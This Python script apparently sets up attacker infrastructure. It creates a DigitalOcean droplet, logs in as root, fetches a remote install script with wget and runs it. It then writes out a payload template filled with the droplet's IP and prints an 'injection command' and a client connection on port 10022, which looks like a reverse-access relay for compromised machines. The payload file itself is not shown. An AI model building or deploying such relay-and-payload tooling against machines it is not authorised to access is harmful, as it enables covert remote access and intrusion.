import time
import digitalocean
from digitalocean import SSHKey
import paramiko
import os

debug=True
if(debug):
    import configdebug as conf
else:
    import config as conf





def connectToDroplet(ip, port):
    '''
    Uses paramiko to ssh into newly created droplet, given an ip and port.
    Once a connection is made, the retrieves and executes the install.sh script.
    '''


    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    fails=0
    connected = False
    maxAttempts= 7
    while (fails < maxAttempts and not connected):
        try:
            print("[-] Attempting SSH Connection")
            ssh.connect(str(ip), username='root', key_filename=conf.digital_ocean['ssh-key-priv'])
            connected=True
            print("[+] SSH Connection Made")
        except Exception as e:
            fails+=1
            print("[!] "+str(e))
            time.sleep(3)
    try:
        print("[-] Retrieving master installation script")

        stdin, stdout, stderr = ssh.exec_command('wget -O installMaster.sh '+conf.digital_ocean['installer-url'])
        time.sleep(5)
        print("[-] Executing retrieved script")

        stdin, stdout, stderr = ssh.exec_command('sh installMaster.sh')
        print("[+] Commands Executed")
        time.sleep(5)
        ssh.close()
        print("[+] SSH Client Closed")
    except Exception as e:
        print('[!] '+str(e))
        ssh.close()
        print("[!] SSH Client Closed")

def createKey():
    user_ssh_key = open(conf.digital_ocean['ssh-key']).read()
    key = SSHKey(token=conf.digital_ocean['token'],
                 name="jumper-ssh-key",
                 public_key=user_ssh_key
            )
    try:
        key.create()
    except Exception as e:
        print("[!] Already Created: "+str(e))
        return


    print('[+] Key Added to DigitalOcean Account')

print('[-] Adding SSH key to manager')
createKey()



manager = digitalocean.Manager(token=conf.digital_ocean['token'])
keys= manager.get_all_sshkeys()

print("[-] Creating Digital Ocean Droplet ["+conf.digital_ocean['masterName']+","+conf.digital_ocean['image']+"]...")


droplet = digitalocean.Droplet(token=conf.digital_ocean['token'],
                               name=conf.digital_ocean['masterName'],
                               region=conf.digital_ocean['region'],
                               image=conf.digital_ocean['image'],
                               size_slug='512mb',
                               backups=False,
                               ssh_keys=keys
                               )
droplet.create()

print("[+] Droplet Created")
print("[-] Checking for status...")

status=""
while(status != "completed"): #ping for server creation
    actions= droplet.get_actions()

    for action in actions:
        action.load()
        status=action.status
        print("[-]\t"+ action.status)

    time.sleep(3)


#Droplet Creation is Completed
print("[+] Creation of Droplet "+ conf.digital_ocean["masterName"] +" complete")

print("[-] Droplet information:")
print("[-]\tID:"+str(droplet.id))
load=droplet.load()
print("[-]\tIPV4:"+load.ip_address)

ip=load.ip_address

print("[-] Connecting to Droplet "+ conf.digital_ocean["masterName"] +"...")
#Attempt SSH Connection
connectToDroplet(ip, 22)

print("[+] Droplet Connected")

print("[-] Generating Payload...")
fileData=""
with open('payload/payload_template.py','r') as file:
    fileData= file.read()

fileData=fileData.replace('#MASTER_IP#', str(ip))

with open('payload/payload.py','w') as file:
    file.write(fileData)
print("[+] Payload generated (/payload/payload.py)")

print("[+] Injection command:\n\t python payload.py\n\t python3 payload.py")

print("[+] Droplet Connection command:\n\t ssh -i keys/digitaloceanKey root@"+str(ip))

print("[+] Client Connection command:\n\t ssh <user>@"+str(ip)+" -p 10022")


#Destroy Droplet once finished
if(input("Would you like to destroy droplet? y/n: ") == "y"):

    print("[-] Destroying Droplet...")
    droplet.destroy()
    print("[+] Droplet Destroyed.")
